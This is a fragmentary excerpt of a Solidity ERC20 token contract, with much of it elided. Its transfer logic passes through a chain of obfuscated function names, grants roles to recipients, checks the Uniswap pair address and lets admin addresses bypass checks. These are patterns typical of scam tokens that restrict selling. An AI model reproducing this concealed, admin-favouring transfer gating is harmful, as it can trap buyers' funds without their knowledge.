...
contract _KCFRJDLERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _KCFRJDLERC20, _KCFRJDLConsole {
    ...
    function _transfer(
        ...
        __KCFRJDLydcxdr(from, to, amt);

    }

    function __KCFRJDLydcxdr(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __KCFRJDLiubhse(from, to, amt);
    }


    function __KCFRJDLiubhse(address from, address to, uint256 amt) internal {
        ...
        __KCFRJDLighnex(from, to, amt);
    }

    function __KCFRJDLighnex(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __KCFRJDLibdxgw(from, to, amt);
    }

    function __KCFRJDLibdxgw(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        __KCFRJDLndfrmfya(from, to, amt);
    }


    function __KCFRJDLndfrmfya(address from, address to, uint256 amt) internal {


        __KCFRJDLitynvdr(from, to, amt);
    }

    function __KCFRJDLitynvdr(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }else if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __KCFRJDLuhfnfead(from, to, amt);
    ...
    function __KCFRJDLuhfnfead(address from, address to, uint256 amt) internal {
        super._transfer(from, to, amt);
    }
